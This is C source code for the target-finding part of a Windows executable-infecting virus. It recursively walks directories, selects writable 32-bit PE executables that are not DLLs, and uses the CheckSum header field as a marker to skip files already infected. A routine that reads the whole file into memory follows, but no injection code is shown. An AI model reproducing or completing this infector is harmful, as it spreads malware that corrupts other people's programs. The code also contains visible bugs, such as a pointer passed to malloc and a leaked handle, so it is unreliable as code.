#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdbool.h>

#pragma warning(disable : 4996)
#define STRCMP_EQUALS 0 
#define READ_FILE_FAILED 0

#define VIRUS_SIGNTURE 0x1234

void set_full_path(char* output, char* path_to_file, char* file_name);


bool is_suitable_file(char* full_path_to_file)
{
    IMAGE_DOS_HEADER file_dos_header;
    IMAGE_NT_HEADERS file_nt_header;
    HANDLE file_handle;
    DWORD result = 0;
    bool result_out = true;
    OVERLAPPED read_from = { 0 };

    // check if file has writing privilege.
    file_handle = CreateFileA(full_path_to_file, 
        GENERIC_ALL,         
        FILE_SHARE_READ,    
        NULL,              
        OPEN_EXISTING,    
        FILE_ATTRIBUTE_NORMAL,
        NULL);               
    if (file_handle == INVALID_HANDLE_VALUE)
    {
        result_out = false;
        goto end;
    }

    // Check if file is PE format.
    result = ReadFile(file_handle, &file_dos_header, sizeof(IMAGE_DOS_HEADER), NULL, NULL);
    if (result == READ_FILE_FAILED)
    {
        result_out = false;
        goto end;
    }
    if (file_dos_header.e_magic != IMAGE_DOS_SIGNATURE)
    {
        result_out = false;
        goto end;
    }

    // Check if file is executable and not dll.
    read_from.Offset = file_dos_header.e_lfanew;
    result = ReadFile(file_handle, &file_nt_header, sizeof(IMAGE_NT_HEADERS), NULL, &read_from);
    if (result == READ_FILE_FAILED)
        return false;
    if (!(file_nt_header.FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE ) || file_nt_header.FileHeader.Characteristics & IMAGE_FILE_DLL)
    {
        result_out = false;
        goto end;
    }

    // Check if the file is 32bit.
    if (!(file_nt_header.FileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE))
    {
        result_out = false;
        goto end;
    }

    // Check if file has already been infected.
    // CheckSum is a PE header field used only for dll and not for exe.
    // So the infector can use it to identify which program has been infect and which don't.
    if (file_nt_header.OptionalHeader.CheckSum == VIRUS_SIGNTURE)
    {
        result_out = false;
        goto end;
    }

end:
    CloseHandle(file_handle);
    return result_out;
}

bool get_suitable_file(char* directory_path, int depth, char file_full_path_out[MAX_PATH])
{
    WIN32_FIND_DATAA ffd;
    LARGE_INTEGER filesize;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError = 0;
    char directory_search_name[MAX_PATH];
    char sub_file_full_path[MAX_PATH];

    // Prepare string for use with FindFile functions.  First, copy the
    // string to a buffer, then append '\*' to the directory name.
    strcpy(directory_search_name, directory_path);
    strcat(directory_search_name, "\\*");

    hFind = FindFirstFileA(directory_search_name, &ffd);

    if (INVALID_HANDLE_VALUE == hFind)
    {
        return false;
    }

    // List all the files in the directory.
    do
    {
        // Hidden file
        if (*ffd.cFileName == '.')
            continue;

        // Directory
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            set_full_path(sub_file_full_path, directory_path, ffd.cFileName);
            if (get_suitable_file(sub_file_full_path, depth + 1, file_full_path_out))
                return true;
            continue;
        }

        // Regular file.
        set_full_path(sub_file_full_path, directory_path, ffd.cFileName);
        if (!is_suitable_file(sub_file_full_path))
            continue;

        strcpy(file_full_path_out, sub_file_full_path);
        return true;
       
    } while (FindNextFileA(hFind, &ffd) != 0);

    FindClose(hFind);
    return false;
}

void* read_entire_file(char* file_path, int* file_size, int *result)
{
    /// <param name="file_path"> path to file </param>
    /// **out**<param name="file_size"> return size of the file </param>
    /// **out**<param name="result"> result of function </param>
    /// <returns> buffer with all of file data </returns>
    void* file_data = NULL;
    HANDLE file_handle = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ,          // allow multiple readers
		NULL,                     // no security
		OPEN_ALWAYS,              // open or create
		FILE_ATTRIBUTE_NORMAL,    // normal file
		NULL);                    // no attr. template 
	*file_size = GetFileSize(file_handle, 0);

    file_data = malloc(file_size);
	if (file_data == NULL)
	{
		*result = ERROR;
		goto end;
	}

	if (!ReadFile(file_handle, file_data, file_size, 0, NULL))
	{
		result = ERROR;
		goto end;
	}

    end:
    return file_data;
}

void set_full_path(char* output, char* path_to_file, char* file_name)
{
    strcpy(output, path_to_file);
    strcat(output, "\\");
    strcat(output, file_name);
}
